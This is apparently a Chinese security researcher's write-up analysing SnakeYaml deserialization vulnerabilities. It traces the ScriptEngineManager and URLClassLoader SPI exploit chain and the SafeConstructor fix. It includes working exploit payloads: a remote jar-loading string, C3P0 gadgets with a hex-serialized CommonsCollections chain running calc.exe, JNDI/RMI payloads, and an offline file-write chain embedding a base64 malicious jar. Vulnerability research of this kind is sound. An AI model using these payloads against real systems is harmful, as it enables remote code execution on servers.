# Yaml语法

SnakeYaml是java的yaml解析类库，支持Java对象的序列化/反序列化，在此之前，先了解一下yaml语法

1. YAML大小写敏感；
2. 使用缩进代表层级关系；
3. 缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）

YAML支持三种数据结构：

1、对象

使用冒号代表，格式为key: value。冒号后面要加一个空格：

```
key: value
```

可以使用缩进表示层级关系：

```
key: 
    child-key: value
    child-key2: value2
```

2、数组

使用一个短横线加一个空格代表一个数组项：

```
hobby:
    - Java
    - LOL
```

3、常量

YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：

```
boolean: 
    - TRUE  #true,True都可以
    - FALSE  #false，False都可以
float:
    - 3.14
    - 6.8523015e+5  #可以使用科学计数法
int:
    - 123
    - 0b1010_0111_0100_1010_1110    #二进制表示
null:
    nodeName: 'node'
    parent: ~  #使用~表示null
string:
    - 哈哈
    - 'Hello world'  #可以使用双引号或者单引号包裹特殊字符
    - newline
      newline2    #字符串可以拆成多行，每一行会被转化成一个空格
date:
    - 2022-07-28    #日期必须使用ISO 8601格式，即yyyy-MM-dd
datetime: 
    -  2022-07-28T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区
```

看师傅推荐了一个yml文件转yaml字符串的地址，网上部分poc是通过yml文件进行本地测试的，实战可能用到的更多的是yaml字符串。https://www.345tool.com/zh-hans/formatter/yaml-formatter

# SnakeYaml序列化与反序列化

## 环境搭建

```
<!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml -->
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

## 序列化

常用方法

```
String	dump(Object data)
将Java对象序列化为YAML字符串。
void	dump(Object data, Writer output)
将Java对象序列化为YAML流。
String	dumpAll(Iterator<? extends Object> data)
将一系列Java对象序列化为YAML字符串。
void	dumpAll(Iterator<? extends Object> data, Writer output)
将一系列Java对象序列化为YAML流。
String	dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)
将Java对象序列化为YAML字符串。
String	dumpAsMap(Object data)
将Java对象序列化为YAML字符串。
<T> T	load(InputStream io)
解析流中唯一的YAML文档，并生成相应的Java对象。
<T> T	load(Reader io)
解析流中唯一的YAML文档，并生成相应的Java对象。
<T> T	load(String yaml)
解析字符串中唯一的YAML文档，并生成相应的Java对象。
Iterable<Object>	loadAll(InputStream yaml)
解析流中的所有YAML文档，并生成相应的Java对象。
Iterable<Object>	loadAll(Reader yaml)
解析字符串中的所有YAML文档，并生成相应的Java对象。
Iterable<Object>	loadAll(String yaml)
解析字符串中的所有YAML文档，并生成相应的Java对象。
```

SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。

- Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；
- Yaml.dump()：将一个对象转化为yaml文件形式；

序列化测试

```
package Snake;

public class User {

    String name;
    int age;

    public User() {
        System.out.println("User构造函数");
    }

    public String getName() {
        System.out.println("User.getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("User.setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("User.getAge");
        return age;
    }

    public void setAge(int age) {
        System.out.println("User.setAge");
        this.age = age;
    }

}
```

```
package Snake;

import org.yaml.snakeyaml.Yaml;

public class test {
    public static void main(String[] args) {
        unserialize();
    }
    public static void serialize(){
        User user = new User();
        user.setName("DawnT0wn");
        user.setAge(25);
        Yaml yaml = new Yaml();
        String str = yaml.dump(user);
        System.out.println(str);
    }
    public static void unserialize(){
        String str1 = "!!Snake.User {age: 25, name: DawnT0wn}";
        String str2 = "age: 25\n" +
                "name: DawnT0wn";
        Yaml yaml = new Yaml();
        yaml.load(str1);
        yaml.loadAs(str2, User.class);
    }

}
```

![image-20220728155741400](images/1.png)

序列化值`!!Snake.User {age: 25, name: DawnT0wn}`

这里的`!!`类似于fastjson中的`@type`用于指定反序列化的全类名

## 反序列化

将序列化字符串反序列化看看效果

![image-20220729210143501](images/2.png)

可以看到load和loadas都调用了对应的setter方法，而且loadas可以直接指定参数值，不用再指定类

# SnakeYaml反序列化漏洞

从上面反序列化的过程中不难发现，这个依赖的反序列化和fastjson有异曲同工之妙，都是可以指定全类名然后去调用相应的setter方法

**影响版本**：全版本

**漏洞原理**：yaml反序列化时可以通过`!!`+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造`ScriptEngineManager`payload并利用SPI机制通过`URLClassLoader`或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。

## 漏洞复现

https://github.com/artsploit/yaml-payload/

按照github上面给的方式编译，修改一下命令即可

![image-20220729102519554](images/3.png)

然后起一个web服务

![image-20220729102324024](images/4.png)

## SPI机制

开始我直接用一个编译好的恶意类生成的jar并无法命令执行，用GitHub的POC才打通，原来是存在一个SPI机制的原因，在把整个流程看完后，才发现这个机制的妙处

SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在ClassPath路径下的META-INF/services文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现

也就是说，我们在META-INF/services下创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类的全类名，在加载这个接口的时候就会实例化里面写上的类

实现原理：
程序会通过`java.util.ServiceLoder`动态装载实现模块，在`META-INF/services`目录下的配置文件寻找实现类的类名，通过`Class.forName`加载进来,`newInstance()`创建对象,并存到缓存和列表里面

看看POC就知道了

![image-20220729172155642](images/5.png)

![image-20220729172207399](images/6.png)

![image-20220729182324597](images/7.png)

在META-INF/services下有一个javax.script.ScriptEngineFactory文件，内容写上了我们的恶意类的名字，然后恶意类实现了这个接口，在最后加载的时候就会加载这个恶意类

**至于为什么这么麻烦地去加载这个恶意类的原因**：因为在exp中，如果直接写上恶意类的名字，在反序列化过程中会报错找不到相应的类（因为会在本地先获取类）

SPI机制nice0e3师傅讲的挺清楚的：https://www.cnblogs.com/nice0e3/p/14514882.html

## 漏洞分析

从load方法开始

![image-20220729200611833](images/8.png)

StreamReader类其实就是个赋值，没必要看，跟进loadFromReader

![image-20220729200837375](images/9.png)

前面大多数都是赋值的操作，没太大的必要，不过调用`BaseConstructor#setComposer()`方法，对`Composer`进行赋值，最终进入`BaseConstructor#getSingleData(type)`方法内，跟进后会调用`this.composer.getSingleNode()`方法对我们传入的payload进行处理，会把`!!`变成tagxx一类的标识，跟进`getSingleData`

![image-20220729201036824](images/10.png)

可以看到`!!`标识已经变成了`tag:yaml.arg.2022:`,在网上也有师傅提到过在`!!`被过滤的情况下可以用这种tag标识来绕过（https://b1ue.cn/archives/407.html）

接下来跟进constructDocument方法

![image-20220731210147648](images/11.png)

继续将node传入constructObject方法，继续跟进

```
protected Object constructObject(Node node) {
    return this.constructedObjects.containsKey(node) ? this.constructedObjects.get(node) : this.constructObjectNoCheck(node);
}
```

![image-20220801093054984](images/12.png)

这里的判断为false，所以进入constructObjectNoCheck方法

![image-20220801143541934](images/13.png)

```
Object data = this.constructedObjects.containsKey(node) ? this.constructedObjects.get(node) : constructor.construct(node);
```

三目运算符的判断条件和刚才是一样的，进入后面的分支，跟进construct方法

![image-20220801155338465](images/14.png)

node一直是刚才处理后的node，跟进getConstructor

![image-20220801155420446](images/15.png)

跟进getClassForNode

![image-20220801155731875](images/16.png)

这里获取node中的tag的类名

![image-20220801155810202](images/17.png)

最外层tag的类名就是ScriptEngineManager，之类只获取一次，所以获取到的name就是ScriptEngineManager，然后传入getClassForName

```
protected Class<?> getClassForName(String name) throws ClassNotFoundException {
    try {
        return Class.forName(name, true, Thread.currentThread().getContextClassLoader());
    } catch (ClassNotFoundException var3) {
        return Class.forName(name);
    }
}
```

这里就直接获取到ScriptEngineManager类然后返回了，回到getClassForNode

![image-20220801160509904](images/18.png)

![image-20220801174914451](images/19.png)

把这个tag和获取到的类放到了应该hashmap里面去，然后返回获取到的类

![image-20220801180943259](images/20.png)

会设置这个node的Type为这个类，然后就往上返回

![image-20220801175918310](images/21.png)

刚才进的getConstructor，现在继续往后看constructor方法，进来后向下步进走else分支

![image-20220801180040687](images/22.png)

前面有一句`SequenceNode snode = (SequenceNode)node;`，就把node的类型转化一下，值还是一样的，因为只有一个value，所以size为1，这里相当于`new ArrayList(1)`，往下就获取一个构造器，因为刚才设置了type为获取到的javax.script.ScriptEngineManager类，所以获取它的所有构造方法放到`arr$`数组里

然后通过for循环`arr$`添加到之前创造的数组possibleConstructors里面去，这里value只有一个，size为1，所以只有有一个参数的构造函数的length满足，这里两个构造函数只有第二个添加进去了

继续往下步进

![image-20220801185347301](images/23.png)

去添加进去的第一个constructor，这里也就只有那一个

在for循环这里，通过迭代器解析下一次的tag，其实for循环里面做的操作和之前差不多，设置type，然后在这里再次调用constructObject，这里就和之前解析的流程一样的了，就不去跟了，最后是解析到`java.net.URL(java.lang.String)`，因为此时`i$`是获取到的value也就是最后的url远程恶意类地址，没有下一个了，所以退出for，直接实例化

![image-20220801191559373](images/24.png)

所以这里实例化的顺序是URL类，URLClassLoader类，ScriptEngineManager类，这里一层一层实例化进去的，但是现在只是实例化了javax.script.ScriptEngineManager，通过URLClassLoader拿到了恶意类，不知道怎么触发最后的命令执行

跟进来到javax.script.ScriptEngineManager的构造函数

![image-20220801192303986](images/25.png)

跟进init

![image-20220801192346076](images/26.png)

跟进initEngines

![image-20220801193921650](images/27.png)

![image-20220801193941775](images/28.png)

![image-20220801194349878](images/29.png)

这里默认返回的一个ServiceLoader的实例化，service是给定的javax.script.ScriptEngineManager，loader是我们写的URLClassLoader，这里其实就和前面讲到的SPI机制一样，调用`getServiceLoader`动态加载类，往下跟进hasNext

![image-20220801194125603](images/30.png)

```
public boolean hasNext() {
    if (knownProviders.hasNext())
        return true;
    return lookupIterator.hasNext();
}
```

跟进`lookupIterator.hasNext()`

```
public boolean hasNext() {
    if (acc == null) {
        return hasNextService();
    } else {
        PrivilegedAction<Boolean> action = new PrivilegedAction<Boolean>() {
            public Boolean run() { return hasNextService(); }
        };
        return AccessController.doPrivileged(action, acc);
    }
}
```

跟进hashNextService

![image-20220801194837397](images/31.png)

这里去获取META-INF/services/javax.script.ScriptEngineFactory类信息，最后返回true

跟进`itr.next`

```
public S next() {
    if (knownProviders.hasNext())
        return knownProviders.next().getValue();
    return lookupIterator.next();
}
```

跟进l`ookupIterator.next()`

```
public S next() {
    if (acc == null) {
        return nextService();
    } else {
        PrivilegedAction<S> action = new PrivilegedAction<S>() {
            public S run() { return nextService(); }
        };
        return AccessController.doPrivileged(action, acc);
    }
}
```

跟进nextService

![image-20220801195603437](images/32.png)

第一次实例化的是NashornScriptEngineFactory，第二次才是POC类

![image-20220801195815350](images/33.png)

最后实例化POC类加载恶意代码

这里才是真的去找META-INF/services/javax.script.ScriptEngineFactory的信息判断返回，如果没有则会返回false，有的话会去获取到里面的信息放到nextName里面

![image-20220801200244961](images/34.png)

然后在第二次进入next的时候走到nextService的时候获取类名然后实例化

![image-20220801200435920](images/35.png)

# 漏洞修复

这个漏洞涉及全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击

修复方案：加入`new SafeConstructor()`类进行过滤

```
package Snake;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class snaketest {
    public static void main(String[] args) {
        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:9000/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml(new SafeConstructor());
        yaml.load(context);
    }

}
```

![image-20220801200707937](images/36.png)

# loadas反序列化

在之前我们都是用的load反序列化，通过指定类，但是在loadas反序列化的情况下，已经被指定了类

看看区别

```
public <T> T load(String yaml) {
    return this.loadFromReader(new StreamReader(yaml), Object.class);
}
```

```
public <T> T loadAs(String yaml, Class<T> type) {
        return this.loadFromReader(new StreamReader(yaml), type);
    }
```

只是后面type不一样，其实只是只要在loadas指定的类里面找到一个Object类型的参数，指定为之前的payload也能造成相应的效果

```
package test;

public class Person  {
    public String username;
    public String age;
    public boolean isLogin;
    public Address address;
}
```

```
package test;

public class Address {
    public String street;
    public Object ext;
    public boolean isValid;
}
```

```
package test;

import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.yaml.snakeyaml.Yaml;


public class test {
    public static void main(String[] args) throws Exception{
        String str = "address: {ext: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:9000/yaml-payload.jar\"]]]]}";
        Yaml yaml = new Yaml();
        yaml.loadAs(str,Person.class);
    }

}
```

![image-20220801202836322](images/37.png)

# 其他利用姿势

## C3P0

### Gadget

之前了解了C3P0配合fastjson来进行jndi注入和加载hex，既然SnakeYaml和fastjson都是可以指定类调用其setter方法，那这里也可以去利用

```
package Snake;

import org.yaml.snakeyaml.Yaml;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class Snakewithfast {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        InputStream in = new FileInputStream("cc6.bin");
        byte[] data = toByteArray(in);
        in.close();
        String HexString = bytesToHexString(data, data.length);
        System.out.println(HexString);
//        String HexString = "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000103f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001b0000000171007e0020737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000000787878";
        Yaml yaml = new Yaml();
        String str = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                "userOverridesAsString: HexAsciiSerializedMap:" + HexString + ';';
        yaml.load(str);

    }
    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }

    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
```

结尾的分号是因为hexstring长度不为偶数

![image-20220801205539420](images/38.png)

一样的，要存在相应的链子才行

### Jndi

```
package Snake;

import org.yaml.snakeyaml.Yaml;

public class Snakewithjndi {
    public static void main(String[] args) throws Exception {
        String str = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
                "jndiName: rmi://127.0.0.1:1099/EXP\n" +
                "loginTimeout: 0";
        Yaml yaml = new Yaml();
        yaml.load(str);
    }
}
```

![image-20220802090730130](images/39.png)

```
package Snake;

import org.yaml.snakeyaml.Yaml;

public class Snakewithjndi {
    public static void main(String[] args) throws Exception {
        String str = "!!com.sun.rowset.JdbcRowSetImpl\n" +
                "dataSourceName: rmi://127.0.0.1:1099/EXP\n" +
                "autoCommit: true";
        Yaml yaml = new Yaml();
        yaml.load(str);
    }
}
```

## 不出网利用

在fastjson1.2.68当中，存在一个任意文件写入的反序列化漏洞

```
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
```

可以看到并没有依赖fastjson的一些类，这些都是java自带的，那SnakeYaml也是可以用到的

改写一下

```
!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["Destpath"],false],!!java.util.zip.Inflater  { input: !!binary base64str },1048576]]
```

Destpath是目的路径，base64str为经过zlib压缩过后的文件内容

```
cat yaml-payload.jar | openssl zlib | base64 -w 0
```

因为我的openssl没有添加zlib支持就没有去弄了，但是师傅写了一个直接生成yaml序列化的POC

```
package Snake;

import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.zip.Deflater;


public class SnakeYamlOffInternet {
    public static void main(String [] args) throws Exception {
        String poc = createPoC("C:/Users/ga't'c/Desktop/临时/yaml-payload-master/yaml-payload.jar","./yaml.jar");
        Yaml yaml = new Yaml();
        yaml.load(poc);

    }


    public static String createPoC(String SrcPath,String Destpath) throws Exception {
        File file = new File(SrcPath);
        Long FileLength = file.length();
        byte[] FileContent = new byte[FileLength.intValue()];
        try{
            FileInputStream in = new FileInputStream(file);
            in.read(FileContent);
            in.close();
        }
        catch (FileNotFoundException e){
            e.printStackTrace();
        }
        byte[] compressbytes = compress(FileContent);
        String base64str = Base64.getEncoder().encodeToString(compressbytes);
        String poc = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\""+Destpath+"\"],false],!!java.util.zip.Inflater  { input: !!binary "+base64str+" },1048576]]";
        System.out.println(poc);
        return poc;
    }

    public static byte[] compress(byte[] data) {
        byte[] output = new byte[0];

        Deflater compresser = new Deflater();

        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        return output;
    }
}
```

最后POC

```
package Snake;

import org.yaml.snakeyaml.Yaml;

public class snaketest {
    public static void main(String[] args) {
        String context = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"./yaml.jar\"],false],!!java.util.zip.Inflater  { input: !!binary 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 },1048576]]\n";
        Yaml yaml = new Yaml();
        yaml.load(context);
    }

}
```

![image-20220802095619441](images/40.png)

